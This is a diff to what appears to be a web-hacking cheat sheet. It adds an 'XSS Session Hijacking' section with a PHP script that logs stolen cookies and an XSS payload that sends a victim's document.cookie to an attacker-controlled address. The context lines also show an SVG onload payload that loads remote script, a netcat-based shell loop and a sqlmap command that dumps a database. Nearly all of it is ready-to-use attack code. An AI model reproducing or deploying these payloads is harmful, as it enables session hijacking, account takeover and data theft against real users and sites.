@@ -366,6 +366,32 @@ Attacker: while :; do printf "j$ "; read c; echo $c | nc -lp PORT >/dev/null; do
 Victim: <svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//HOST:PORT";d.body.appendChild(z)},0)>
 ```
 
+### XSS Session Hijacking
+
+Have this php file hosted on your machine<br />
+```
+<?php
+        header ('Location:http://domain');
+
+        if (isset($_GET["c"]))
+        {
+                $cookies = base64_decode(urldecode($_GET["c"]));
+                $file = fopen('log.txt', 'a');
+                fwrite($file, $cookies . "\n\n");
+        }
+?>
+
+```
+Run this script where you find web application is vulnerable to xss
+`<script>document.location='http://<ip>/cookie.php?c='+encodeURIComponent(btoa(document.cookie));</script>`
+
+
+Alternatively run this <br/ >
+
+https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md<br/>
+
+
+
 ### SQL Map
 `sqlmap -r request.txt --dbms=mysql --dump`
 
